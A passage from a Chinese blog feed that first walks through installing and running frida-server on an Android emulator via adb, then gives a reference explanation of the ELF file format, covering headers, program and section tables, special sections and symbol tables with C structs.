href="https://blog.csdn.net/weixin_44903147/article/details/104065844">adb工具包</a>。使用adb查看和连接安卓设备，查看安卓设备的架构类型。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">C:\Users\v5le0n9\Downloads\platform-tools_r33.0.2-windows&gt;adb devices</span><br><span class="line">List of devices attached</span><br><span class="line">192.168.24.101:5555     device</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">C:\Users\v5le0n9\Downloads\platform-tools_r33.0.2-windows&gt;adb shell</span><br><span class="line">vbox86p:/ # getprop ro.product.cpu.abi</span><br><span class="line">x86</span><br><span class="line">vbox86p:/ #</span><br></pre></td></tr></table></figure><p>查看Frida在Windows上的版本，从 <a href="https://github.com/frida/frida/releases">https://github.com/frida/frida/releases</a> 下载对应Frida版本和对应安卓架构的Frida-server。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">C:\Users\v5le0n9&gt;frida --version</span><br><span class="line">15.2.2</span><br></pre></td></tr></table></figure><p><a href="https://github.com/frida/frida/releases/download/15.2.2/frida-server-15.2.2-android-x86.xz">frida-server-15.2.2-android-x86.xz</a></p><p>解压后进入到存放Frida-server目录，Shift + 右键打开Powershell。运行以下命令将Frida-server上传到安卓设备的/data/local/tmp目录下。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">PS C:\Users\v5le0n9\Downloads&gt; adb push .\frida-server-15.2.2-android-x86 /data/local/tmp</span><br><span class="line">.\frida-server-15.2.2-android-x86: 1 file pushed, 0 skipped. 206.2 MB/s (46387888 bytes in 0.215s)</span><br><span class="line">PS C:\Users\v5le0n9\Downloads&gt;</span><br></pre></td></tr></table></figure><p>将安卓设备中的Frida-server赋予777权限并运行。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">vbox86p:/ # cd /data/local/tmp</span><br><span class="line">vbox86p:/data/local/tmp # chmod 777 frida-server-15.2.2-android-x86</span><br><span class="line">vbox86p:/data/local/tmp # ./frida-server-15.2.2-android-x86</span><br></pre></td></tr></table></figure><p>在Powershell中输入以下命令：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">frida-ps -U</span><br></pre></td></tr></table></figure><p>如果存在<code>android.process.acore</code>等信息表示Windows和安卓设备的Frida框架搭建成功。</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;没想到吧，我又润来学安卓了。。。实习就是这样的啦，多点尝试。&lt;/p&gt;</summary>
    
    
    
    <category term="Android逆向" scheme="http://example.com/categories/Android%E9%80%86%E5%90%91/"/>
    
    
  </entry>
  
  <entry>
    <title>ELF文件格式</title>
    <link href="http://example.com/posts/187bfa35.html"/>
    <id>http://example.com/posts/187bfa35.html</id>
    <published>2022-07-28T14:18:08.185Z</published>
    <updated>2022-07-28T14:36:34.088Z</updated>
    
    <content type="html"><![CDATA[<p>Android是基于Linux开发的，所以了解ELF格式对学习Android逆向和Linux逆向是必不可少的。</p><p>可执行与可链接格式 （Executable and Linkable Format，ELF），常被称为 ELF格式，是一种用于可执行文件、目标代码、共享库和核心转储（core dump）的标准文件格式，一般用于类Unix系统，比如Linux，Macox等。ELF 格式灵活性高、可扩展，并且跨平台。比如它支持不同的字节序和地址范围，所以它不会不兼容某一特别的 CPU 或指令架构。这也使得 ELF 格式能够被运行于众多不同平台的各种操作系统广泛采纳。</p><span id="more"></span><h1 id="1-ELF文件类型"><a href="#1-ELF文件类型" class="headerlink" title="1. ELF文件类型"></a>1. ELF文件类型</h1><ul><li>可重定位文件（<code>.o</code>文件）：文件保存着代码和适当的数据，用来和其它文件一起创建一个可执行文件或者是一个共享目标文件。</li><li>可执行文件（<code>.out</code>文件）：包含二进制代码和数据，可直接被加载器加载执行。</li><li>共享目标文件（<code>.so</code>文件）：共享库，用于和其它共享目标文件或者可重定位文件一起生成共享目标文件或者和可执行文件一起创建进程映像。</li></ul><h1 id="2-ELF文件作用"><a href="#2-ELF文件作用" class="headerlink" title="2. ELF文件作用"></a>2. ELF文件作用</h1><p>ELF文件参与程序的链接(建立一个程序)和程序的执行(运行一个程序)，所以可以从不同的角度来看待ELF格式的文件：</p><ol><li><p>如果用于<strong>编译和链接</strong>（可重定位文件），则<strong>编译器和链接器</strong>将把ELF文件看作是节头表描述的节的集合，程序头表可选。</p></li><li><p>如果用于<strong>加载执行</strong>（可执行文件），则<strong>加载器</strong>则将把ELF文件看作是程序头表描述的段的集合，一个段可能包含多个节，节头表可选。</p></li></ol><img src="/posts/187bfa35/2.1.1.png" class="" title="链接阶段和执行阶段"><h1 id="3-ELF文件格式"><a href="#3-ELF文件格式" class="headerlink" title="3. ELF文件格式"></a>3. ELF文件格式</h1><p>ELF文件由4部分组成，分别是ELF头（ELF header）、程序头表（Program header table）、节（Section）和节头表（Section header table）。实际上，一个文件中不一定包含全部内容，而且它们的位置也未必如图所示这样安排，只有ELF头的位置是固定的，其余各部分的位置、大小等信息由ELF头中的各项值来决定。</p><img src="/posts/187bfa35/3.1.1.jpg" class="" title="ELF文件格式"><h2 id="3-1-ELF文件头"><a href="#3-1-ELF文件头" class="headerlink" title="3.1 ELF文件头"></a>3.1 ELF文件头</h2><p>ELF文件头描述了ELF文件的基本类型、地址偏移等信息，分为32bit和64bit两个版本，定义于Linux源码的<code>/usr/include/elf.h</code>文件中。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> EI_NIDENT16</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">elf32_hdr</span>&#123;</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">char</span>e_ident[EI_NIDENT];<span class="comment">//ELF文件的描述，是一个16字节的标识，表明当前文件的数据格式、位数等【重要】</span></span><br><span class="line">  Elf32_Halfe_type;<span class="comment">//文件的标识字段标识文件的类型【重要】</span></span><br><span class="line">  Elf32_Halfe_machine;<span class="comment">//目标文件的体系结构</span></span><br><span class="line">  Elf32_Worde_version;<span class="comment">//目标文件的体系结构版本</span></span><br><span class="line">  Elf32_Addre_entry;<span class="comment">//程序的虚拟入口地址，如果文件没有对应的入口可以为0【重要】</span></span><br><span class="line">  Elf32_Offe_phoff;<span class="comment">//文件中程序头表的偏移(bytes)，如果文件没有该项，则应该为0【重要】</span></span><br><span class="line">  Elf32_Offe_shoff;<span class="comment">//文件中段表/节表的偏移(bytes)，如果文件没有该项，则应该为0【重要】</span></span><br><span class="line">  Elf32_Worde_flags;<span class="comment">//处理器相关的标志位，宏格式为EF_machine_flags比如EF_MIPS_PIC</span></span><br><span class="line">  Elf32_Halfe_ehsize;<span class="comment">//ELF文件头的大小(bytes)【重要】</span></span><br><span class="line">  Elf32_Halfe_phentsize;<span class="comment">//程序头表中单项的大小，表中每一项的大小相同</span></span><br><span class="line">  Elf32_Halfe_phnum;<span class="comment">//程序头表中的项数，也就是说程序头表的实际大小为ephentsize × e_phnum，如果文件中没有程序头表该项为0</span></span><br><span class="line">  Elf32_Halfe_shentsize;<span class="comment">//节表中单项的大小，表中每一项的大小相同</span></span><br><span class="line">  Elf32_Halfe_shnum;<span class="comment">//节表中项的数量</span></span><br><span class="line">  Elf32_Halfe_shstrndx;<span class="comment">//节表中节名的索引，如果文件没有该表则该项为SHN_UNDEF(0)</span></span><br><span class="line">&#125; Elf32_Ehdr;</span><br></pre></td></tr></table></figure><p>数据类型说明：</p><div class="table-container"><table><thead><tr><th>名称</th><th>大小</th><th>用途</th></tr></thead><tbody><tr><td>unsigned char</td><td>1</td><td>无符号小整数</td></tr><tr><td>Elf32_Half</td><td>2</td><td>无符号中等大小整数</td></tr><tr><td>Elf32_Word</td><td>4</td><td>无符号大整数</td></tr><tr><td>Elf32_Addr</td><td>4</td><td>无符号程序地址</td></tr><tr><td>Elf32_Off</td><td>4</td><td>无符号文件偏移</td></tr><tr><td>Elf32_Sword</td><td>4</td><td>有符号大整数</td></tr></tbody></table></div><p>64bit和32bit仅仅只是字长的区别，字段上没有实际上的差别。</p><p>某些成员的相关参数：</p><p><code>e_ident[EI_NIDENT]</code>：ELF文件的描述，是一个16字节的标识，表明当前文件的数据格式、位数等。</p><img src="/posts/187bfa35/3.1.2.png" class="" title="e_iden[EI_NIDENT]"><ul><li>前4字节为魔数，取值为固定的0x7F454C46，标记当前文件为一个ELF文件。</li><li>第5个字节表明当前文件类别：0表示非法，1表示32bit，2表示64bit。</li><li>第6个字节表明当前文件的数据排列方式：0表示非法，1表示小端，2表示大端。</li><li>第7个字节表明当前文件的版本：0表示未知，1表示当前版本。</li><li>第某个字节是<code>EI_PAD</code>的起点，即<code>e_ident[EI_PAD]</code>表明<code>e_ident</code>中未使用的字节的起点，未使用的字节会被初始化为0，解析ELF文件时需要忽略对应的字段。</li></ul><p><code>e_type</code>：文件的标识字段标识文件的类型。</p><div class="table-container"><table><thead><tr><th>参数</th><th>说明</th></tr></thead><tbody><tr><td>ET_NONE(0)</td><td>未知的文件格式</td></tr><tr><td>ET_REL(1)</td><td>可重定位文件</td></tr><tr><td>ET_EXEC(2)</td><td>可执行文件</td></tr><tr><td>ET_DYN(3)</td><td>共享目标文件</td></tr><tr><td>ET_CORE(4)</td><td>Core转储文件，比如程序crash后的转储文件</td></tr><tr><td>ET_LOPROC(0xff00)</td><td>特定处理器的文件标识</td></tr><tr><td>ET_HIPROC(0xffff)</td><td>特定处理器的文件标识</td></tr><tr><td>[ET_LOPROC, ET_HIPROC]</td><td>区间的值用来表示特定处理器的文件格式</td></tr></tbody></table></div><p><code>e_machine</code>：目标文件的体系结构。</p><div class="table-container"><table><thead><tr><th>参数</th><th>说明</th></tr></thead><tbody><tr><td>EM_NONE(0)</td><td>未知的处理器架构</td></tr><tr><td>EM_M32(1)</td><td>AT&amp;T WE 32100</td></tr><tr><td>EM_SPARC(2)</td><td>SPARC</td></tr><tr><td>EM_386(3)</td><td>Intel 80386</td></tr><tr><td>EM_68K(4)</td><td>Motorola 68000</td></tr><tr><td>EM_88K(5)</td><td>Motorola 88000</td></tr><tr><td>EM_860(6)</td><td>Intel 80860</td></tr><tr><td>EM_MIPS(7)</td><td>MIPS RS3000大端</td></tr><tr><td>EM_MIPS_RS4_BE(10)</td><td>MIPS RS4000大端</td></tr><tr><td>其他</td><td>预留</td></tr></tbody></table></div><h2 id="3-2-程序头表"><a href="#3-2-程序头表" class="headerlink" title="3.2 程序头表"></a>3.2 程序头表</h2><p>可执行文件或共享目标文件的程序头表是一个结构数组，每个元素描述了一个段或者系统准备程序执行所必需的其它信息。程序头表描述了ELF文件中Segment在文件中的布局，描述了OS该如何装载可执行文件到内存。程序头表的表项的描述如下，类似于ELF Header也有32和64位两个版本。但程序头表的相关字段偏移有些差别。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">elf32_phdr</span> &#123;</span></span><br><span class="line">Elf32_Word p_type;<span class="comment">//当前Segment的类型</span></span><br><span class="line">Elf32_Off p_offset;<span class="comment">//当前段相对于文件起始位置的偏移量</span></span><br><span class="line">Elf32_Addr p_vaddr;<span class="comment">//段的第一个字节将被映射到到内存中的虚拟地址</span></span><br><span class="line">Elf32_Addr p_paddr;<span class="comment">//此成员仅用于与物理地址相关的系统中</span></span><br><span class="line">Elf32_Word p_filesz;<span class="comment">//段在文件映像中所占的字节数，可能为 0</span></span><br><span class="line">Elf32_Word p_memsz;<span class="comment">//段在内存映像中占用的字节数，可能为 0</span></span><br><span class="line">Elf32_Word p_flags;<span class="comment">//段相关的标志</span></span><br><span class="line">Elf32_Word p_align;<span class="comment">//段在文件中和内存中如何对齐</span></span><br><span class="line">&#125; Elf32_Phdr;</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">elf64_phdr</span> &#123;</span></span><br><span class="line">Elf64_Word p_type;</span><br><span class="line">Elf64_Word p_flags;</span><br><span class="line">Elf64_Off p_offset;<span class="comment">/* Segment file offset */</span></span><br><span class="line">Elf64_Addr p_vaddr;<span class="comment">/* Segment virtual address */</span></span><br><span class="line">Elf64_Addr p_paddr;<span class="comment">/* Segment physical address */</span></span><br><span class="line">Elf64_Xword p_filesz;<span class="comment">/* Segment size in file */</span></span><br><span class="line">Elf64_Xword p_memsz;<span class="comment">/* Segment size in memory */</span></span><br><span class="line">Elf64_Xword p_align;<span class="comment">/* Segment alignment, file &amp; memory */</span></span><br><span class="line">&#125; Elf64_Phdr;</span><br></pre></td></tr></table></figure><p>某些成员的相关参数：</p><p><code>p_type</code>：当前Segment的类型。</p><div class="table-container"><table><thead><tr><th>参数</th><th>说明</th></tr></thead><tbody><tr><td>PT_NULL(0)</td><td>当前项未使用，项中的成员是未定义的，需要忽略当前项</td></tr><tr><td>PT_LOAD(1)</td><td>当前Segment是一个可装载的Segment，即可以被装载映射到内存中，其大小由<code>p_filesz</code>和<code>p_memsz</code>描述。如果<code>p_memsz &gt; p_filesz</code>则剩余的字节被置零，但是<code>p_filesz &gt; p_memsz</code>是非法的。动态库一般包含两个该类型的段：代码段和数据段</td></tr><tr><td>PT_DYNAMIC(2)</td><td>动态段、动态库特有的段，包含了动态链接必须的一些信息，比如需要链接的共享库列表、GOT等等</td></tr><tr><td>PT_INTERP(3)</td><td>当前段用于存储一段以NULL为结尾的字符串，该字符串表明了程序解释器的位置。且当前段仅仅对于可执行文件有实际意义，一个可执行文件中不能出现两个当前段</td></tr><tr><td>PT_NOTE(4)</td><td>用于保存与特定供应商或者系统相关的附加信息以便于兼容性、一致性检查，但是实际上只保存了操作系统的规范信息</td></tr><tr><td>PT_SHLIB(5)</td><td>保留段</td></tr><tr><td>PT_PHDR(6)</td><td>保存程序头表本身的位置和大小，当前段不能在文件中出现一次以上，且仅仅当程序头表为内存映像的一部分时起作用，它必须在所有加载项目之前</td></tr><tr><td>[PT_LPROC(0x70000000), PT_HIPROC(0x7fffffff)]</td><td>该范围内的值用作预留</td></tr></tbody></table></div><img src="/posts/187bfa35/3.2.1.png" class="" title="程序头表"><h2 id="3-3-节头表"><a href="#3-3-节头表" class="headerlink" title="3.3 节头表"></a>3.3 节头表</h2><p>节头表描述了ELF文件中的节的基本信息。可执行文件不一定有节头表但是一定有节，节头表可利用特殊的方式去除。节头表是也是一个结构数组，每个元素描述了不同的节。</p><p>段和节的区别是：</p><ul><li>段包含了程序装载可执行的基本信息，段告诉OS如何装载当前段到虚拟内存以及当前段的权限和执行相关的信息等，一个段可以包含0个或多个节；</li><li>节包含了程序的代码和数据等内容，链接器会将多个节合并为一个段。</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">elf32_shdr</span> &#123;</span></span><br><span class="line">  Elf32_Wordsh_name;<span class="comment">//值是节名称在字符串表中的索引</span></span><br><span class="line">  Elf32_Wordsh_type;<span class="comment">//描述节的类型和语义</span></span><br><span class="line">  Elf32_Wordsh_flags;<span class="comment">//1bit位的标志位</span></span><br><span class="line">  Elf32_Addrsh_addr;<span class="comment">//如果当前节需要被装载到内存，则当前项存储当前节映射到内存的首地址，否则应该为0</span></span><br><span class="line">  Elf32_Offsh_offset;<span class="comment">//当前节的首地址相对于文件的偏移</span></span><br><span class="line">  Elf32_Wordsh_size;<span class="comment">//节的大小。但是对于类型为SHT_NOBITS的节，当前值可能不为0但是在文件中不占据任何空间</span></span><br><span class="line">  Elf32_Wordsh_link;<span class="comment">//存储节头表中的索引，表示当前节依赖于对应的节。对于特定的节有特定的含义，其他为SHN_UNDEF</span></span><br><span class="line">  Elf32_Wordsh_info;<span class="comment">//节的附加信息。对于特定的节有特定的含义，其他为0</span></span><br><span class="line">  Elf32_Wordsh_addralign;<span class="comment">//地址约束对齐，值应该为0或者2的幂次方，0和1表示未进行对齐</span></span><br><span class="line">  Elf32_Wordsh_entsize;<span class="comment">//某些节是一个数组，对于这类节当前字段给出数组中每个项的字节数，比如符号表。如果节并不包含对应的数组，值应该为0</span></span><br><span class="line">&#125; Elf32_Shdr;</span><br></pre></td></tr></table></figure><p>某些成员的相关参数：</p><p><code>sh_type</code>：描述节的类型和语义。</p><div class="table-container"><table><thead><tr><th>参数</th><th>说明</th></tr></thead><tbody><tr><td>SHT_NULL(0)</td><td>当前节是非活跃的，没有一个对应的具体的节内存</td></tr><tr><td>SHT_PROGBITS(1)</td><td>包含了程序的指令信息、数据等程序运行相关的信息</td></tr><tr><td>SHT_SYMTAB(2)</td><td>保存了符号信息，用于重定位。此种类型节的<code>sh_link</code>存储相关字符串表的节索引，<code>sh_info</code>存储最后一个局部符号的符号表索引+1</td></tr><tr><td>SHT_DYNSYM(11)</td><td>保存共享库导入动态符号信息。此种类型节的<code>sh_link</code>存储相关字符串表的节索引，<code>sh_info</code>存储最后一个局部符号的符号表索引+1</td></tr><tr><td>SHT_STRTAB(3)</td><td>一个字符串表，保存了每个节的节名称</td></tr><tr><td>SHT_RELA(4)</td><td>存储可重定位表项，可能会有附加内容，目标文件可能有多个可重定位表项。此种类型节的<code>sh_link</code>存储相关符号表的节索引，<code>sh_info</code>存储重定位所使用节的索引</td></tr><tr><td>SHT_HASH(5)</td><td>存储符号哈希表，所有参与动态链接的目标只能包含一个哈希表，一个目标文件只能包含一个哈希表。此种类型节的<code>sh_link</code>存储哈希表所使用的符号表的节索引,<code>sh_info</code>为0</td></tr><tr><td>SHT_DYAMIC(6)</td><td>存储包含动态链接的信息，一个目标文件只能包含一个。此种类型的节的<code>sh_link</code>存储当前节中使用到的字符串表格的节的索引，<code>sh_info</code>为0</td></tr><tr><td>SHT_NOTE(7)</td><td>存储以某种形式标记文件的信息</td></tr><tr><td>SHT_NOBITS(8)</td><td>这种类型的节不占据文件空间，但是成员<code>sh_offset</code>依然会包含对应的偏移</td></tr><tr><td>SHT_REL(9)</td><td>包含可重定位表项，无附加内容，目标文件可能有多个可重定位表项。此种类型节的<code>sh_link</code>存储相关符号表的节索引，<code>sh_info</code>存储重定位所使用节的索引</td></tr><tr><td>SHT_SHLIB(10)</td><td>保留区，包含此节的程序与ABI不兼容</td></tr><tr><td>[SHT_LOPROC(0x70000000), SHT_HIPROC(0x7fffffff)]</td><td>留给处理器专用语义</td></tr><tr><td>[SHT_LOUSER(0x80000000), SHT_HIUSER(0xffffffff)]</td><td>预留</td></tr></tbody></table></div><p><code>sh_flags</code>：1bit位的标志位。</p><div class="table-container"><table><thead><tr><th>参数</th><th>说明</th></tr></thead><tbody><tr><td>SHF_WRITE(0x1)</td><td>当前节包含进程执行过程中可写的数据</td></tr><tr><td>SHF_ALLOC(0x2)</td><td>当前节在运行阶段占据内存</td></tr><tr><td>SHF_EXECINSTR(0x4)</td><td>当前节包含可执行的机器指令</td></tr><tr><td>SHF_MASKPROC(0xf0000000)</td><td>所有包含当前掩码都表示预留给特定处理器的</td></tr></tbody></table></div><img src="/posts/187bfa35/3.3.1.png" class="" title="节头表"><h3 id="3-3-1-一些特殊的节"><a href="#3-3-1-一些特殊的节" class="headerlink" title="3.3.1 一些特殊的节"></a>3.3.1 一些特殊的节</h3><p>ELF文件中用一些预定义的节来保存程序、数据和一些控制信息，这些节被用来链接或者装载程序。每个操作系统都支持一组链接模式，主要分为两类（也就是常说的动态库和静态库）：</p><ul><li>Static：静态绑定的一组目标文件、系统库和库档案（比如静态库），解析包含的符号引用并创建一个完全自包含的可执行文件；</li><li>Dynamic：一组目标文件、库、系统共享资源和其他共享库链接在一起创建可执行文件。当加载此可执行文件时必须使系统中其他共享资源和动态库可用，程序才能正常运行。</li></ul><p>库文件无论是动态库还是静态库在其文件中都包含对应的节，一些特殊的节其功能如下：</p><p><code>.bss</code>，类型<code>SHT_NOBITS</code>，属性<code>SHF_ALLOC|SHF_WRITE</code>：存储未经初始化的数据。根据定义程序开始执行时，系统会将这些数据初始化为0，且此节不占用文件空间；</p><p><code>.comment</code>，类型<code>SHT_PROGBITS</code>，属性<code>none</code>：存储版本控制信息；</p><p><code>.data</code>，类型<code>SHT_PROGBITS</code>，属性<code>SHF_ALLOC|SHF_WRITE</code>：存放初始化的数据；</p><p><code>.data1</code>，类型<code>SHT_PROGBITS</code>，属性<code>SHF_ALLOC|SHF_WRITE</code>：存放初始化的数据；</p><p><code>.debug</code>，类型<code>SHT_PROGBITS</code>，属性<code>none</code>：存放用于符号调试的信息；</p><p><code>.dynamic</code>，类型<code>SHT_DYNAMIC</code>，属性<code>SHF_ALLOC</code>，是否有属性<code>SHF_WRITE</code>屈居于处理器：包含动态链接的信息，</p><p><code>.hash</code>，类型<code>SHT_HASH</code>，属性<code>SHF_ALLOC</code>：哈希符号表；</p><p><code>.line</code>，类型<code>SHT_PROGBITS</code>，属性<code>none</code>：存储调试的行号信息，描述源代码和机器码之间的对应关系；</p><p><code>.note</code>，类型<code>SHT_NOTE</code>，属性<code>none</code>：额外的编译器信息，比如程序的公司名、发布版本号等；</p><p><code>.rodata</code>，类型<code>SHT_PROGBITS</code>，属性<code>SHF_ALLOC</code>：存储只读数据；</p><p><code>.rodata1</code>，类型<code>SHT_PROGBITS</code>，属性<code>SHF_ALLOC</code>：存储只读数据；</p><p><code>.shstrtab</code>，类型<code>SHT_STRTAB</code>，属性<code>none</code>：存储节的名称；</p><p><code>.strtab</code>，类型<code>SHT_STRTAB</code>，属性<code>none</code>：存储常见的与符号表关联的字符串。如果文件有一个包含符号字符串表的可加载段，则该段的属性将包括<code>SHF_ALLOC</code>位； 否则，该位将关闭；</p><p><code>.symtab</code>，类型<code>SHT_SYMTAB</code>，属性<code>none</code>：存储一个符号表。如果文件具有包含符号表的可加载段，则该节的属性将包括<code>SHF_ALLOC</code>位；否则，该位将关闭；</p><p><code>.text</code>，类型<code>SHT_PROGBITS</code>，属性<code>SHF_ALLOC|SHF_EXECINSTR</code>：存储程序的代码指令；</p><p><code>.dynstr</code>，类型<code>SHT_STRTAB</code>，属性<code>SHF_ALLOC</code>：存储动态链接所需的字符串，最常见的是表示与符号表条目关联的名称的字符串；</p><p><code>.dynsym</code>，类型<code>SHT_DYNSYM</code>，属性<code>SHF_ALLOC</code>：存储动态链接符号表；</p><p><code>.fini</code>，类型<code>SHT_PROGBITS</code>，属性<code>SHF_ALLOC|SHF_EXECINSTR</code>：存储有助于进程终止代码的可执行指令。 当程序正常退出时，系统执行本节代码；</p><p><code>.init</code>，类型<code>SHT_PROGBITS</code>，属性<code>SHF_ALLOC|SHF_EXECINSTR</code>：存储有助于进程初始化代码的可执行指令。 当程序开始运行时，系统会在调用主程序入口点（C 程序称为 main）之前执行本节中的代码；</p><p><code>.interp</code>，类型<code>SHT_PROGBITS</code>，<code>SHF_ALLOC</code>：保存程序解释器的路径名。 如果文件有一个包含该节的可加载段，则该节的属性将包括 <code>SHF_ALLOC</code> 位； 否则，该位将关闭；</p><p><code>.relname</code>，类型<code>SHT_REL</code>：包含重定位信息。如果文件具有包含重定位的可加载段，则这些部分的属性将包括 <code>SHF_ALLOC</code>位；否则，该位将关闭。通常，名称由 重定位适用的部分。因此<code>.text</code>的重定位部分通常具有名称<code>.rel.text</code>或<code>.rela.text</code>；</p><p><code>.relaname</code>，类型<code>SHT_RELA</code>：同relname。</p><p>其它：对于C++程序有些版本会有<code>.ctors</code>（有时也会是<code>.init_array</code>）和<code>.dtors</code>两个节存储构造和析构相关的代码。</p><h2 id="3-4-字符串表"><a href="#3-4-字符串表" class="headerlink" title="3.4 字符串表"></a>3.4 字符串表</h2><p>字符串表是一个存储字符串的表格，而每个字符串是以NULL也就是<code>\0</code>为结尾的。字符串表格中索引为0处的字符串被定义为空字符串。符号表中保存的字符串是节名和目标文件中使用到的符号。而需要使用对应字符串时，只需要在需要使用的地方指明对应字符在字符串表中的索引即可，使用的字符串就是索引处到第一个<code>\0</code>之间的字符串。</p><img src="/posts/187bfa35/3.4.1.png" class="" title="字符串表"><h2 id="3-5-符号表"><a href="#3-5-符号表" class="headerlink" title="3.5 符号表"></a>3.5 符号表</h2><p>目标文件的符号表包含定位和重定位程序的符号定义和引用所需的信息。符号表索引是该数组的下标。索引0既指定表中的第一个条目，又用作未定义的符号索引。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">elf32_sym</span>&#123;</span></span><br><span class="line">  Elf32_Wordst_name;<span class="comment">//存储一个指向字符串表的索引来表示对应符号的名称</span></span><br><span class="line">  Elf32_Addrst_value;<span class="comment">//存储对应符号的取值，具体值依赖于上下文，可能是一个指针地址，立即数等</span></span><br><span class="line">  Elf32_Wordst_size;<span class="comment">//符号的大小，具体指为sizeof(instance)，如果未知则为0</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">char</span>st_info;<span class="comment">//指定符号的类型和绑定属性</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">char</span>st_other;<span class="comment">//该成员当前持有 0 并且没有定义的含义</span></span><br><span class="line">  Elf32_Halfst_shndx;<span class="comment">//每个符号都有属于的节，当前成员存储的就是对应节的索引</span></span><br><span class="line">&#125; Elf32_Sym;</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">elf64_sym</span> &#123;</span></span><br><span class="line">  Elf64_Word st_name;<span class="comment">/* Symbol name, index in string tbl */</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">char</span>st_info;<span class="comment">/* Type and binding attributes */</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">char</span>st_other;<span class="comment">/* No defined meaning, 0 */</span></span><br><span class="line">  Elf64_Half st_shndx;<span class="comment">/* Associated section index */</span></span><br><span class="line">  Elf64_Addr st_value;<span class="comment">/* Value of the symbol */</span></span><br><span class="line">  Elf64_Xword st_size;<span class="comment">/* Associated symbol size */</span></span><br><span class="line">&#125; Elf64_Sym;</span><br></pre></td></tr></table></figure><p>某些成员的相关参数：</p><p><code>st_value</code>：存储对应符号的取值，具体值依赖于上下文，可能是一个指针地址，立即数等。另外，不同对象文件类型的符号表条目对<code>st_value</code>成员的解释略有不同：</p><ul><li>在可重定位文件中，<code>st_value</code>保存节索引为<code>SHN_COMMON</code>的符号的对齐约束，<code>st_value</code>保存已定义符号的节偏移量。 也就是说，<code>st_value</code>是从<code>st_shndx</code>标识的部分的开头的偏移量。</li><li>在可执行文件和共享对象文件中，<code>st_value</code>保存一个虚拟地址。 为了使这些文件的符号对动态链接器更有用，节偏移（文件解释）让位于与节号无关的虚拟地址（内存解释）。</li></ul><p><code>st_info</code>：指定符号的类型和绑定属性。可以用下面的代码分别解析出<code>bind、type、info</code>三个属性：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> ELF32_ST_BIND(i) ((i)&gt;&gt;4) </span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> ELF32_ST_TYPE(i) ((i)&amp;0xf) </span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> ELF32_ST_INFO(b,t) (((b)&lt;&lt;4)+((t)&amp;0xf))</span></span><br></pre></td></tr></table></figure><ul><li>BIND：</li></ul><div class="table-container"><table><thead><tr><th>参数</th><th>说明</th></tr></thead><tbody><tr><td>STB_LOCAL(0)</td><td>局部符号在包含其定义的目标文件之外是不可见的。 